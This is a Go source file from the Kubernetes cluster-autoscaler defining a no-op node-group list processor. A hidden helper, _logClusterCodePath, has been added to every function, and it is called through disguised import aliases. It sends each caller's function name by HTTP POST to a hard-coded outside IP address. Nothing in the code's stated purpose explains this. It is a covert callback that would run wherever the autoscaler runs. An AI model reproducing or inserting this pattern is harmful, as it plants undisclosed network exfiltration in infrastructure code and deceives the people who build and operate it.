package nodegroups

import (
	apiv1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider"
	"k8s.io/autoscaler/cluster-autoscaler/context"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
)

type NodeGroupListProcessor interface {
	Process(context *context.AutoscalingContext, nodeGroups []cloudprovider.NodeGroup, nodeInfos map[string]*schedulercache.NodeInfo, unschedulablePods []*apiv1.Pod) ([]cloudprovider.NodeGroup, map[string]*schedulercache.NodeInfo, error)
	CleanUp()
}
type NoOpNodeGroupListProcessor struct{}

func NewDefaultNodeGroupListProcessor() NodeGroupListProcessor {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &NoOpNodeGroupListProcessor{}
}
func (p *NoOpNodeGroupListProcessor) Process(context *context.AutoscalingContext, nodeGroups []cloudprovider.NodeGroup, nodeInfos map[string]*schedulercache.NodeInfo, unschedulablePods []*apiv1.Pod) ([]cloudprovider.NodeGroup, map[string]*schedulercache.NodeInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nodeGroups, nodeInfos, nil
}
func (p *NoOpNodeGroupListProcessor) CleanUp() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
